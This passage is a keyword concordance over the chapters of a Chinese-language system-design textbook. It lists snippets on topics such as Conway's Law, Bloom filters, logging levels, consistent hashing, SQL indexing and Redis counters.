  c28_b05.md: ...器——延迟 100ms–2 秒（100ms–2s），取决于运行时和包大小。这对延迟敏感路径不可接受。 * 执行时间限制：AWS Lambda 函数最多运行 15 分钟（15 minutes）。长时间运行工作负载（视频转码、机器学习训练）不适合该模...
  c28_b08.md: ...= true       backup_retention_period = 7     }   应用此配置会在 AWS 上创建指定参数的 PostgreSQL 数据库。修改 `instance_class` 并重新应用即可升级实例。配置文...
  c28_b08.md: ...= true       backup_retention_period = 7     }   应用此配置会在 AWS 上创建指定参数的 PostgreSQL 数据库。修改 `instance_class` 并重新应用即可升级实例。配置文...

=== conway (6 occurrences) ===
  c13_b03.md: ...你得到了微服务的运维复杂度，却没有独立性。   #### 康威定律（Conway's Law）  1967 年，Mel Conway 观察到：“设计系统的组织，其产生的设计等价于这些组织沟通结构的镜像。”这就是**康威定律（Conway's Law）*...
  c13_b03.md: ...独立微服务只会增加开销，而没有提供本应证明其合理性的组织独立性。  康威定律的推论，有时叫“逆康威动作（Inverse Conway Maneuver）”，是设计你的组织以匹配你想要的架构。如果你想让 User 和 Payment 服务干净分离，就组建...
  c28_b01.md: ...工程师，将获得最后的发言权。  * * *   ### 28.1 康威定律——组织的镜子  1967 年，Melvin Conway 观察到设计系统的组织会受约束，只能产出反映其沟通结构的设计。他当时写的是软件编译器，但这一观察普遍适用。  想一想：8...
  c28_b02.md: ...#### 逆康威机动  如果康威定律是描述，那么 **Inverse Conway Maneuver** 就是处方：有意按照你想要的架构来 structuring 你的组织。  如果你想要一个具有清晰服...
  intro.md: ...（侦探简报）”开篇，把需求呈现为一个谜题——而这正是真实工程团队设计讨论的实际方式。  最后一章跳出架构，审视人的层面：Conway's Law（康威定律）如何意味着组织架构无论你是否愿意都会塑造系统，blameless post-mortems（无追...
  intro.md: ...系统，blameless post-mortems（无追责事后复盘）为何是可靠性机制而非管理仪式，以及 Inverse Conway Maneuver（逆康威策略）有时为何是最有效的架构干预手段。本书认真对待一个理念：系统由人建造，而不只是由遵循最佳实...

=== failed (6 occurrences) ===
  c15_b13.md: ...PENDING" | "EMAIL_PENDING" | "COMPLETE" | "COMPENSATING" | "FAILED"     payment_idempotency_key: "saga_7f3a9b2c_charge"     us...
  c15_b13.md: ...失败。** Payment Service 返回错误（无效卡、余额不足等）。编排器记录 `current_step = FAILED`。无需补偿——没有任何状态被改变。向客户端返回失败原因。  **失败场景 (b)：支付成功，User Service...
  c15_b13.md: ...ce 发起退款（幂等键 `saga_7f3a9b2c_refund`）以补偿扣款。记录 `current_step = FAILED`。向客户端返回错误：“您的升级未能完成。任何已扣款项已退款。”  **失败场景 (c)：所有步骤成功后，编排器在标记...
  c15_b13.md: ...，编排器的恢复进程查询所有 `current_step != COMPLETE AND current_step != FAILED` 的 saga。它发现 `saga_7f3a9b2c` 仍处于 `EMAIL_PENDING`（COMPLETE 之前...
  c17_b04.md: ...生了什么。这就是日志的角色。  考虑请求失败时产生的两种日志消息：  **非结构化日志：**       ERROR: Failed to load user profile for request from 192.168.1.45   **结构化日...
  c17_b04.md: ...生了什么。这就是日志的角色。  考虑请求失败时产生的两种日志消息：  **非结构化日志：**       ERROR: Failed to load user profile for request from 192.168.1.45   **结构化日...

=== info (6 occurrences) ===
  c17_b04.md: ...不同服务的日志时间戳必须可比；时区歧义会造成抓狂的调试会话。 2. **Severity level**——DEBUG、INFO、WARN、ERROR、FATAL。级别让你过滤噪声：生产环境通常只看 INFO 及以上；调试时临时开启 DEBUG。...
  c17_b04.md: ...rity level**——DEBUG、INFO、WARN、ERROR、FATAL。级别让你过滤噪声：生产环境通常只看 INFO 及以上；调试时临时开启 DEBUG。 3. **Service and version**——哪个服务产生这条日志，以...
  c17_b05.md: ...处理器中，可能记录每个请求的每个 header。开发和调试时 invaluable，但生产环境产生巨大体量——通常是 INFO 日志的十到一百倍。大多数生产系统默认关闭 DEBUG，只在调试特定服务时按需开启。  INFO 日志记录正常、预期但有...
  c17_b05.md: ...产生巨大体量——通常是 INFO 日志的十到一百倍。大多数生产系统默认关闭 DEBUG，只在调试特定服务时按需开启。  INFO 日志记录正常、预期但有意义粒度的事件：“用户登录”、“支付处理完成”、“key X 缓存未命中”。它们讲述正常操作的故...
  c17_b11.md: ...LO（例如 60 秒）则告警  **日志事件（结构化）：**  * `notification_consumed` — INFO：`{trace_id, notification_id, user_id, type, enqueue_time}`...
  c17_b11.md: ...user_id, type, enqueue_time}` * `notification_delivered` — INFO：`{trace_id, notification_id, user_id, channel, latency_ms}`...

=== gauge (6 occurrences) ===
  c17_b10.md: ...#### 概念检测  **Q1.** Gauge 和 Histogram 有什么区别，各自何时使用？  **答案：** Gauge 测量某时刻当前状态，可增可减——适合...
  c17_b10.md: ...#### 概念检测  **Q1.** Gauge 和 Histogram 有什么区别，各自何时使用？  **答案：** Gauge 测量某时刻当前状态，可增可减——适合“现在值是多少？”的问题，如当前内存用量、当前队列深度、当前活跃连接数。Histo...
  c17_b10.md: ...值在预定义桶中的分布——适合“这个测量值的分布如何？”的问题，如请求延迟、响应大小、队列等待时间。当你关心当前水平时用 gauge；当你关心大量测量值的分布和尾部行为时用 histogram。  **Q2.** 当 CPU 使用率超过 80% 时触发...
  c17_b10.md: ...#### 概念检测  **Q1.** Gauge 和 Histogram 有什么区别，各自何时使用？  **答案：** Gauge 测量某时刻当前状态，可增可减——适合...
  c17_b10.md: ...#### 概念检测  **Q1.** Gauge 和 Histogram 有什么区别，各自何时使用？  **答案：** Gauge 测量某时刻当前状态，可增可减——适合“现在值是多少？”的问题，如当前内存用量、当前队列深度、当前活跃连接数。Histo...
  c17_b10.md: ...值在预定义桶中的分布——适合“这个测量值的分布如何？”的问题，如请求延迟、响应大小、队列等待时间。当你关心当前水平时用 gauge；当你关心大量测量值的分布和尾部行为时用 histogram。  **Q2.** 当 CPU 使用率超过 80% 时触发...

=== histogram (6 occurrences) ===
  c17_b10.md: ...#### 概念检测  **Q1.** Gauge 和 Histogram 有什么区别，各自何时使用？  **答案：** Gauge 测量某时刻当前状态，可增可减——适合“现在值是多少？”的问题...
  c17_b10.md: ...Gauge 测量某时刻当前状态，可增可减——适合“现在值是多少？”的问题，如当前内存用量、当前队列深度、当前活跃连接数。Histogram 记录许多观察值在预定义桶中的分布——适合“这个测量值的分布如何？”的问题，如请求延迟、响应大小、队列等待时间。当你关心...
  c17_b10.md: ...”的问题，如请求延迟、响应大小、队列等待时间。当你关心当前水平时用 gauge；当你关心大量测量值的分布和尾部行为时用 histogram。  **Q2.** 当 CPU 使用率超过 80% 时触发监控告警。这是什么类型告警，有什么弱点？  **答案：**...
  c17_b10.md: ...#### 概念检测  **Q1.** Gauge 和 Histogram 有什么区别，各自何时使用？  **答案：** Gauge 测量某时刻当前状态，可增可减——适合“现在值是多少？”的问题...
  c17_b10.md: ...Gauge 测量某时刻当前状态，可增可减——适合“现在值是多少？”的问题，如当前内存用量、当前队列深度、当前活跃连接数。Histogram 记录许多观察值在预定义桶中的分布——适合“这个测量值的分布如何？”的问题，如请求延迟、响应大小、队列等待时间。当你关心...
  c17_b10.md: ...”的问题，如请求延迟、响应大小、队列等待时间。当你关心当前水平时用 gauge；当你关心大量测量值的分布和尾部行为时用 histogram。  **Q2.** 当 CPU 使用率超过 80% 时触发监控告警。这是什么类型告警，有什么弱点？  **答案：**...

=== contract (6 occurrences) ===
  c18_b08.md: ...会失败，直到代码也更新。  高可用（high-availability，可用性）系统最安全的迁移模式是**expand-contract**，也称**parallel change**：  **阶段 1（Expand）：** 在旁边添加新状态。如果你需要把...
  c18_b08.md: ...后如何确认系统恢复健康？ 5. **数据库考虑：** 如果部署包含迁移，回滚能否处理已迁移数据？（这就是 expand-contract 迁移如此宝贵的原因——旧代码在新旧 schema 状态下都能工作。）  只存在于脑海中的回滚计划不是回滚计划。在部署前...
  c18_b10.md: ...真实用户行为和指标再下决定的变更。  **Q3.** 为什么数据库 schema 迁移是部署中最难的部分，expand-contract 模式为什么比直接 schema 变更更安全？  **答案：** 直接 schema 变更危险，因为数据库 schema...
  c18_b10.md: ...失败——可能瞬间影响所有用户。回滚需要反向重跑迁移，如果数据已按新 schema 写入，这可能不可能。  expand-contract 模式更安全，因为它同时保持旧和新 schema 状态有效，允许旧代码和新代码在迁移窗口期间共存。应用可以部署、回滚、再...
  c18_b12.md: ...操作顺序：数据库必须先满足什么，应用代码才能运行？应用必须先满足什么，用户才能看到功能？对数据库迁移使用 expand-contract 模式，并考虑三个阶段是否需要协调。  **答案：**  **阶段 1——数据库 Expand（第 1 周）：**  *...
  c18_b15.md: ...险管理工具。蓝绿提供瞬时回滚。金丝雀把影响范围限制在少部分用户。功能开关把部署与发布解耦。数据库迁移需要 expand-contract 模式，以在部署窗口期间保持向后兼容。  SocialSnap 的第一次金丝雀部署——新 feed 排序算法——表明部署...

=== bit (6 occurrences) ===
  c20_b01.md: ...一个 URL 短链接服务。你给服务一个长 URL，它给你一个短 URL。有人访问短 URL 时，被重定向到长 URL。`bit.ly/xyz123` → `https://www.example.com/very/long/path/that/n...
  c20_b01.md: ...我们把它形式化为可重复格式。   ### 侦探简报  **客户：** 一家初创公司想为公众构建 URL 缩短服务，类似 bit.ly。用户通过 Web 界面和 API 缩短 URL。缩短链接将出现在社交媒体帖子、邮件和营销活动中。  **线索（需...
  c27_b05.md: ...现在我们有 1000 万（10 million）用户，设计假设被违反了。”这种债务随着系统上下文变化而无形累积。  **Bit rot：** 旧代码从未被触碰，逐渐与当前模式隔离，直到不改坏某些东西就无法变更。第 3 个月写的通知系统从未重构，随...
  c27_b05.md: ...逐渐与当前模式隔离，直到不改坏某些东西就无法变更。第 3 个月写的通知系统从未重构，随着团队在周围演进编码标准，它累积 bit rot。  **架构债务：** 分片键选择（`user_id mod 8`）对当前规模有效，但限制未来选项。这是最昂贵...
  c27_b05.md: ...现在我们有 1000 万（10 million）用户，设计假设被违反了。”这种债务随着系统上下文变化而无形累积。  **Bit rot：** 旧代码从未被触碰，逐渐与当前模式隔离，直到不改坏某些东西就无法变更。第 3 个月写的通知系统从未重构，随...
  c27_b05.md: ...逐渐与当前模式隔离，直到不改坏某些东西就无法变更。第 3 个月写的通知系统从未重构，随着团队在周围演进编码标准，它累积 bit rot。  **架构债务：** 分片键选择（`user_id mod 8`）对当前规模有效，但限制未来选项。这是最昂贵...

=== bloom (6 occurrences) ===
  c23_b02.md: ...URL 约 100 字节；100 亿 × 100 字节 = seen set 单独 1 TB 内存）。实用方案是 **Bloom filter** —— 一种概率数据结构，以极高确定性回答“我见过这个 URL 吗？”，但每个条目只用几位。1% 误报...
  c23_b02.md: ...概率数据结构，以极高确定性回答“我见过这个 URL 吗？”，但每个条目只用几位。1% 误报率下，100 亿 URL 的 Bloom filter 约需 9.6 GB——更易管理。误报代价只是偶尔跳过其实未爬过的 URL。由于大多数这类误报针对非常次要...
  c23_b09.md: ...常见词，posting list 也只是所有文档的极小一部分。  **Q4.** 为什么爬虫的 seen-set 需要 Bloom filter 而不是标准 hash set？  **答案：** 标准 hash set 把每个 URL 存为完整字符串...
  c23_b09.md: ...llion）URL 平均 100 字节，精确 seen-set 约需 1 TB 内存——昂贵，可能超过单机可用 RAM。Bloom filter 用多个哈希函数每个条目只存几位；1% 误报率下可在大约 10 GB 内表示 100 亿 URL。误报代价...
  c23_b09.md: ...微不足道——爬虫可能偶尔跳过未见 URL，但它会从其他链接路径再次遇到。误报率（把未见 URL 判为已见）按构造为零——Bloom filter 永远不会把未见条目误判为已见。...
  c23_b13.md: ...，URL frontier 是其核心调度结构。关键洞察是爬虫作为侦探：它跟随证据（链接）同时评估来源可信度。礼貌、通过 Bloom filter 的重复检测以及基于优先级的调度是生产爬虫的三大支柱。  **倒排索引** 应用了第 7 章缓存和第 22...

=== filter (6 occurrences) ===
  c23_b02.md: ...100 字节；100 亿 × 100 字节 = seen set 单独 1 TB 内存）。实用方案是 **Bloom filter** —— 一种概率数据结构，以极高确定性回答“我见过这个 URL 吗？”，但每个条目只用几位。1% 误报率下，100...
  c23_b02.md: ...，以极高确定性回答“我见过这个 URL 吗？”，但每个条目只用几位。1% 误报率下，100 亿 URL 的 Bloom filter 约需 9.6 GB——更易管理。误报代价只是偶尔跳过其实未爬过的 URL。由于大多数这类误报针对非常次要的页面，这是可...
  c23_b09.md: ...sting list 也只是所有文档的极小一部分。  **Q4.** 为什么爬虫的 seen-set 需要 Bloom filter 而不是标准 hash set？  **答案：** 标准 hash set 把每个 URL 存为完整字符串。100 亿（...
  c23_b09.md: ...URL 平均 100 字节，精确 seen-set 约需 1 TB 内存——昂贵，可能超过单机可用 RAM。Bloom filter 用多个哈希函数每个条目只存几位；1% 误报率下可在大约 10 GB 内表示 100 亿 URL。误报代价微不足道——爬...
  c23_b09.md: ...爬虫可能偶尔跳过未见 URL，但它会从其他链接路径再次遇到。误报率（把未见 URL 判为已见）按构造为零——Bloom filter 永远不会把未见条目误判为已见。...
  c23_b13.md: ...rontier 是其核心调度结构。关键洞察是爬虫作为侦探：它跟随证据（链接）同时评估来源可信度。礼貌、通过 Bloom filter 的重复检测以及基于优先级的调度是生产爬虫的三大支柱。  **倒排索引** 应用了第 7 章缓存和第 22 章预计算 t...

=== keyspace (6 occurrences) ===
  c26_b02.md: ...上一个位置。规则：键由环上从该键位置顺时针方向第一个节点拥有。  添加节点时，它只接管其位置到逆时针邻居之间的键——占 keyspace 约 1/N 的比例。删除节点时，其键由顺时针邻居接管。集群变化时只有约 1/N 的键移动——相对模哈希是巨大改进。...
  c26_b02.md: ...0 虚拟节点，环上有 2000 个位置分布在 10 个物理节点上。大量虚拟节点平滑分布：每个物理节点大约拥有 1/10 keyspace，方差很小。  虚拟节点还有次要好处：当物理节点加入一个已有 V 个虚拟节点的集群时，它可从多个现有节点吸收虚拟节点位置...
  c26_b04.md: ...会有相同的根哈希。如果根哈希不同，副本在某处分歧。要找出哪里：比较根的两个子节点。如果只有左子节点哈希不同，分歧在左半 keyspace。递归进入左子树直到到达存在分歧的叶子（具体键范围）。  plain 语言：Merkle tree 是数据集的指纹。比较...
  c26_b04.md: ...次键比较。只有分歧键范围的数据需要传输修复。  anti-entropy 过程在后台持续运行：  1. 每个节点维护其 keyspace 的 Merkle tree，随键变化增量更新 2. 节点定期与对等节点比较根哈希 3. 若根不同，树比较将分歧缩小到具...
  c26_b05.md: ...gossip 把新节点到来传播给集群。数秒内所有节点都知道新来者。新节点从 gossip 获得当前环配置，并开始接收其 keyspace 份额。  节点故障（停止响应）时，尝试与其 gossip 的 peer 最终会发现。若干次失败尝试后，peer 把该节...
  c26_b06.md: ...Merkle tree 比较在约 20 次哈希比较内（每节点 10 亿键的 log₂ = 30 层）将分歧定位到很小的 keyspace 范围。实际修复数据只有 10 万条分歧条目——而非全部 10 亿——因此修复在分钟级而非小时级完成。  * * *...

=== provider (6 occurrences) ===
  c28_b04.md: ...称 Function-as-a-Service 或 FaaS）是一种云执行模型，开发者部署单个函数（而非整个服务），云 provider 处理所有基础设施：服务器分配、扩展、负载均衡和维护。开发者只为代码实际执行时间付费，而不为空闲服务器时间付费。  pl...
  c28_b04.md: ...in 语言：你写一个函数，上传到 AWS Lambda 或 Google Cloud Functions。请求来时，云 provider 在需要的基础设施上运行你的函数，自动扩展以处理更多请求，并按毫秒执行时间收费。你从未配置过服务器或负载均衡器。...
  c28_b05.md: ...求时无成本） * 强制隔离：每个函数都是干净、无状态的单元  **成本：**  * 冷启动延迟：函数若近期未被调用，云 provider 必须启动新容器——延迟 100ms–2 秒（100ms–2s），取决于运行时和包大小。这对延迟敏感路径不可接受。 *...
  c28_b05.md: ...：你无法配置内核、网络栈或硬件。对有特殊性能要求的情况是约束。 * 厂商锁定：serverless 函数深度绑定特定云 provider 的 API、事件模型和触发机制。迁移到不同 provider 需要重写集成层。 * 可观测性挑战：追踪跨 5 个串行调...
  c28_b05.md: ...* 厂商锁定：serverless 函数深度绑定特定云 provider 的 API、事件模型和触发机制。迁移到不同 provider 需要重写集成层。 * 可观测性挑战：追踪跨 5 个串行调用的 serverless 函数请求需要仔细设置分布式追踪——...
  c28_b06.md: ...Assembly 代码处理，延迟低于 1 毫秒（sub-millisecond）。  这之所以可能，是因为现代 CDN provider（Cloudflare Workers、AWS Lambda@Edge、Fastly Compute）提供可编程边缘执行...

=== complexity (6 occurrences) ===
  c28_b10.md: ...ct | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Caching** (Ch 7) | 大幅降低读延迟（缓存命中） | 最终...
  c28_b11.md: ...ct | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Relational DB (PostgreSQL)** (Ch 5) |...
  c28_b12.md: ...ct | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Horizontal scaling** (Ch 11) | 无延迟成本；...
  c28_b13.md: ...ct | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Graceful degradation** (Ch 16) | 无延迟开...
  c28_b14.md: ...ct | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **URL shortening (redirect)** (Ch 20) |...
  c28_b15.md: ...ct | Consistency Impact | Availability Impact | Operational Complexity ---|---|---|---|--- **Microservice decomposition (Conway's...

=== concept (6 occurrences) ===
  c28_b10.md: ...#### 第一部分：基础  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact...
  c28_b11.md: ...#### 第二部分：构建块  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact...
  c28_b12.md: ...#### 第三部分：扩展模式  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact...
  c28_b13.md: ...#### 第四部分：可靠性与运维  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact...
  c28_b14.md: ...#### 第五部分：案例研究模式  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact...
  c28_b15.md: ...#### 第六部分：组织与元层面  Pattern / Concept | Latency Impact | Consistency Impact | Availability Impact...

=== com (5 occurrences) ===
  c01_b02.md: ...#### 一个简单系统的组成部分  我们来具体化。当你的朋友在浏览器中输入 `https://socialsnap.com/posts/42` 并按下回车时，一连串事件就开始了：  1. 浏览器向 DNS 服务器发问：“socialsnap....
  c01_b02.md: .../posts/42` 并按下回车时，一连串事件就开始了：  1. 浏览器向 DNS 服务器发问：“socialsnap.com 的 IP 地址是多少？” 2. DNS 服务器回答：“是 203.0.113.7。” 3. 浏览器向 203.0.11...
  c05_b01.md: ...ated_at | |---|---|---|---|---| | 1 | alice | alice@example.com | `$2b$12...` | 2024-01-15 | | 2 | bob | bob@example.com |...
  c05_b01.md: ...le.com | `$2b$12...` | 2024-01-15 | | 2 | bob | bob@example.com | `$2b$12...` | 2024-01-20 | | 3 | carol | carol@example.co...
  c05_b01.md: ...om | `$2b$12...` | 2024-01-20 | | 3 | carol | carol@example.com | `$2b$12...` | 2024-02-01 |  **posts 表**  | id | user_id |...

=== tolerance (5 occurrences) ===
  c02_b05.md: ...Durability）把多个保证打包在一起——我们将在第 5 章仔细审视它们。   ### 2.5 Partition Tolerance——当网络说谎时  上面的指标——latency（延迟）、throughput（吞吐）、availability（可用性...
  c02_b05.md: ...务器组 A 内部可以通信，服务器组 B 内部可以通信，但 A 和 B 不能通信。  **分区容错性（partition tolerance）** 是系统在网络分区发生时仍能继续正确运行的能力。  对于跨多台机器部署的系统——即每个有趣的大规模系统——分区容错...
  c02_b09.md: ...cy、throughput、availability、consistency、durability、partition tolerance）按对该用例的重要性排序，并说明前三名的理由。  提示  想想牺牲每个指标会发生什么。哪种牺牲是灾难性的，哪种只是烦人？...
  c02_b09.md: ...ity（持久性） > Consistency（一致性） > Availability（可用性） > Partition Tolerance（分区容错性） > Throughput（吞吐） > Latency（延迟）**  **为什么持久性第一：** 确认后却...
  c02_b12.md: ...ailability（可用性）、consistency（一致性）、durability（持久性）和 partition tolerance（分区容错性）**——是衡量每个架构决策的坐标轴。  没有系统能同时在所有六个轴上最优。添加缓存，你获得延迟和吞吐，牺牲...

=== reliability (5 occurrences) ===
  c02_b06.md: ...果还剩 40 分钟，而关键安全补丁必须上线，你花掉预算。  这种 framing（框架）由 Google 的 Site Reliability Engineering（SRE）团队发明——把可靠性从绝对目标变成可协商的资源。我们将在第 17 章讨论监控时回到 S...
  c23_b04.md: ...ed computing and consistency（一致性）" 4 | "design patterns for reliability"  用户搜索 "distributed systems（分布式系统）"。朴素做法是扫描全部四份文档，找包含两个词的。4...
  c23_b04.md: ...esign | [2, 4] hard | [1] consistency | [3] tradeoffs | [2] reliability | [4]  "distributed systems" 的查询变成：取 "distributed" 的 postin...
  c26_b12.md: ...都在为本章铺垫。前五个部分——Foundations、Building Blocks、Scaling Patterns、Reliability、Case Studies——中哪个概念最直接重现在分布式键值存储设计中？...
  c26_b13.md: ...拟节点（第 12 章分片概念）分布负载。水平扩展原则（第 11 章）适用：任何节点可处理任何请求，使系统无状态且可扩展。Reliability（第 16–19 章）：Hinted handoff 是可靠性机制——类似第 16 章优雅降级模式。节点故障时系统优雅降...

=== miss (5 occurrences) ===
  c02_b09.md: ...失事件。保证 100% 需要分布式系统中的 exactly-once 语义，代价很高（第 15 章）。那 0.5% 的 miss 率就是使用 at-least-once 配送加去重（deduplication），而不是更复杂的 exactly-on...
  c07_b04.md: ...cache HIT:        - Return the cached value     3. If cache MISS:        - Query the database for the value        - Store t...
  c07_b05.md: ...almost always a HIT (cache is always up to date)     2. On miss (first access or cache restart): fetch from database   **收益...
  c07_b07.md: ...return json.loads(cached)  # Cache hit          # Cache miss — query database         profile = db.query("SELECT * FROM...
  c17_b06.md: ...s)           [25ms - 50ms]  Redis: get cached_feed (25ms) → MISS           [52ms - 200ms] Post Service: fetch_posts (148ms)...

=== modest (5 occurrences) ===
  c03_b05.md: ...GB/年** → 5 年后约 600 GB  **100 万用户时 SocialSnap 的结论：** 这些数字非常 modest。一台配置合理的服务器（比如 32 核、128 GB RAM、2 TB SSD）就能舒适处理——峰值 QPS 只有 19...
  c03_b07.md: ...0 请求/秒 × 200 字节输入 = **232 KB/s**（可忽略）  **结论：** 这个系统读密集且带宽需求 modest。架构优先级：带激进缓存的快速读路径。数据库写路径不那么关键——需要时队列可以缓冲写入。  **Q2.** Social...
  c03_b10.md: ...拆成可估算的部分，相乘，再用直觉做合理性检查。  我们把这些应用到 SocialSnap，发现在 100 万用户时负载 modest——一台配置合理的服务器就够。数字会告诉你什么时候该加复杂度，同样重要的是，什么时候不该加。  **SocialSnap...
  c16_b14.md: ...面完全失败 → 1.99% 完全失败，另有 0.98% 提供降级但可用体验）展示了优雅降级的价值。完全失败率的绝对提升 modest，但用户体验提升显著：原本看到总错误的用户现在看到功能略减的页面。  **Q2.** 在 SocialSnap 周二的...
  c20_b02.md: ...P 响应——大约 500 字节 * 116,000 RPS × 500 字节 = **58 MB/s 出站带宽**—— modest  **缓存估算：**  * 第 7 章的 Zipf 分布适用：一小部分 URL 会占大部分流量。如果最热的 1% UR...

=== log (5 occurrences) ===
  c15_b05.md: ...而是为已完成步骤运行“撤销”操作。  关键洞见：**补偿事务取代回滚**。单数据库里可以回滚，因为数据库维护 undo log。跨服务的分布式系统中没有共享 undo log。相反，你要设计显式操作，从语义上逆转已完成步骤的效果。  例如，如果“...
  c15_b05.md: ...**补偿事务取代回滚**。单数据库里可以回滚，因为数据库维护 undo log。跨服务的分布式系统中没有共享 undo log。相反，你要设计显式操作，从语义上逆转已完成步骤的效果。  例如，如果“信用卡扣款”成功，然后“更新用户为高级版”失败：...
  c23_b06.md: ...ment d 中的总词数 IDF(t)=log(总文档数 / 包含 t 的文档数)  出现在每份文档中的词 IDF = log(1) = 0——对排序无贡献。只出现在 1 份文档中的词 IDF = log(10,000,000,000) ≈ 23...
  c23_b06.md: ...数)  出现在每份文档中的词 IDF = log(1) = 0——对排序无贡献。只出现在 1 份文档中的词 IDF = log(10,000,000,000) ≈ 23——找到它是强信号。  多词查询 "distributed consisten...
  c28_b11.md: ...（异步） | 最终（消费者按自己节奏处理） | 极高——故障域解耦 | 中–高 **Kafka distributed log** (Ch 8) | 低（顺序磁盘写） | 分区内有序；跨消费者最终 | 极高——复制、持久化 | 高——Zookee...

=== committed (5 occurrences) ===
  c05_b05.md: ...--| | Read Uncommitted（读未提交） | 可能 | 可能 | 可能 | 很少有用 | | Read Committed（读已提交） | 防止 | 可能 | 可能 | 大多数 Web 应用（PostgreSQL 默认） | | Repeat...
  c05_b05.md: ...zable（可串行化） | 防止 | 防止 | 防止 | 最高正确性要求 |  大多数 Web 应用使用 **Read Committed**——它防止读到另一个事务未提交的更改，同时保持良好并发。只在正确性要求时才用 Serializable，因为它会显著...
  c05_b05.md: ...系数据库可以在每个副本上 ACID-一致，但跨副本不是线性一致的。 2. **隔离级别很重要。** 如果你在 Read Committed 隔离下运行（常见默认），仍可能遇到不可重复读——请求开始时读到的值在结束时可能已经改变。这是否重要取决于应用逻辑。...
  c05_b14.md: ...么全无）、一致性（没有无效状态）、隔离性（并发事务互不干扰）、持久性（已提交数据在崩溃后幸存）。隔离有级别——Read Committed 是常见默认，Serializable 在更高成本下提供最大正确性。  我们介绍了 **SocialSnap v1**：...
  c06_b02.md: ...**代价（一致性）：** 大多数文档存储提供比关系型数据库更弱的一致性。MongoDB 的默认隔离级别相当于“Read Committed”，多文档事务直到 4.0 版（2018 年）才加入——并且伴随性能开销。跨多个文档建模数据可能带来一致性挑战。  **...

=== limit (5 occurrences) ===
  c05_b06.md: ...-- Alice 的 user_id     ORDER BY posts.created_at DESC     LIMIT 20;  这条查询 join 三张表。如果 `follows.follower_id` 和 `posts.create...
  c05_b10.md: ...username = 'alice')     ORDER BY posts.created_at DESC     LIMIT 20;  有了 `idx_mentions_user_id`，数据库先找到 Alice 的 `user_id`，再用索...
  c05_b12.md: ...sts     WHERE user_id = 42     ORDER BY created_at DESC     LIMIT 20;  **为什么需要索引：** 如果没有 `user_id` 索引，数据库会执行全表扫描——读取 `posts`...
  c06_b11.md: ...VAL '24 hours'     GROUP BY tag     ORDER BY count DESC     LIMIT 10;   **Tradeoff（权衡）：** 如果每天有 50 million（5000 万）帖子、每个帖子约 2...
  c12_b05.md: ...like_count     FROM posts     ORDER BY like_count DESC     LIMIT 10;   现在需要查询全部 8 个 shard，从每个 shard 取前 10，再在应用层合并结果找出真正全球前 1...

=== tokyo (5 occurrences) ===
  c05_b07.md: ...制引入一致性 tradeoff（第 4 章）。  **地理延迟：** 如果你的数据库服务器在 Virginia，用户在 Tokyo，每次数据库查询都要跨太平洋。本地 1ms 的数据库查询，跨洲链路上要花 150ms+。  这些限制驱动 SocialS...
  c07_b03.md: ...存  **内容分发网络（Content Delivery Network，CDN）** 是地理分布的缓存服务器网络。当 Tokyo 的用户请求 New York 服务器上的图片时，他们不必等待往返（仅网络延迟就约 150ms）。相反，CDN 在 To...
  c07_b03.md: ...yo 的用户请求 New York 服务器上的图片时，他们不必等待往返（仅网络延迟就约 150ms）。相反，CDN 在 Tokyo 有一台缓存服务器。如果图片在那里被缓存，就从 Tokyo 提供：~5ms。  CDN 是边缘缓存——它们把数据物理上带...
  c07_b03.md: ...不必等待往返（仅网络延迟就约 150ms）。相反，CDN 在 Tokyo 有一台缓存服务器。如果图片在那里被缓存，就从 Tokyo 提供：~5ms。  CDN 是边缘缓存——它们把数据物理上带到离用户更近的地方。它们擅长缓存静态内容（图片、视频、可下...
  c07_b16.md: ...染响应，TTL 5 分钟。任何用户在某个 CDN 节点（比如 Tokyo）的第一次请求从源服务器取页面。接下来的一千个 Tokyo 请求从边缘缓存取——无需命中源服务器。  架构要求是：**URL 必须是响应的唯一决定因素，CDN 缓存才能工作**。...

=== author (5 occurrences) ===
  c05_b10.md: ...前：**      SELECT posts.id, posts.content, posts.created_at, author.username AS author     FROM mentions     JOIN posts ON ment...
  c05_b10.md: ...sts.id, posts.content, posts.created_at, author.username AS author     FROM mentions     JOIN posts ON mentions.post_id = post...
  c05_b10.md: ...JOIN posts ON mentions.post_id = posts.id     JOIN users AS author ON posts.user_id = author.id     WHERE mentions.user_id = (...
  c05_b10.md: ...t_id = posts.id     JOIN users AS author ON posts.user_id = author.id     WHERE mentions.user_id = (SELECT id FROM users WHERE...
  c09_b14.md: ...ount       }       feed(limit: 20) {         postId         author { username photoUrl }         content         likeCount...

=== likes (5 occurrences) ===
  c05_b10.md: ...` 的 join 很快，因为它们在主键上 join。  **Q2.**（联系第 3 章估算）SocialSnap 的 `likes` 表快速增长：每天 300 万新点赞。一年后 `likes` 表约有 1.1 billion（11 亿）行。查询“帖子...
  c05_b10.md: ...Q2.**（联系第 3 章估算）SocialSnap 的 `likes` 表快速增长：每天 300 万新点赞。一年后 `likes` 表约有 1.1 billion（11 亿）行。查询“帖子 12345 有多少赞？”现在花 500ms。诊断可能原因并...
  c05_b10.md: ...其 tradeoff（权衡）。  **答案：**  **诊断：** 查询是 `SELECT COUNT(*) FROM likes WHERE post_id = 12345`。在 1.1 billion（11 亿）行下，如果 `post_id` 没...
  c05_b10.md: ...`post_id` 上添加/修复索引**      CREATE INDEX idx_likes_post_id ON likes(post_id);...
  c05_b14.md: ...PostgreSQL 数据库支持的 Flask 应用，schema 包含 users、posts、follows 和 likes。这是一个完整、正确的基础，能在触及限制前处理数万到数十万用户。  这些限制——单机写入能力、存储限制和单点故障——驱动...

=== incr (5 occurrences) ===
  c06_b03.md: ..._token → "abc123xyz"      SET post:101:like_count 14322     INCR post:101:like_count → 14323   这就是 Redis。操作是亚毫秒级，因为 Redis 把整...
  c06_b03.md: ...会话数据。任何应用服务器都能快速查找任何用户的会话，无需数据库查询。  **计数器和限流器：** Redis 的原子 `INCR` 操作非常适合点赞数、浏览数和限流（“用户 X 这分钟已调用 47 次 API”）。  **实时数据：** 排行榜（R...
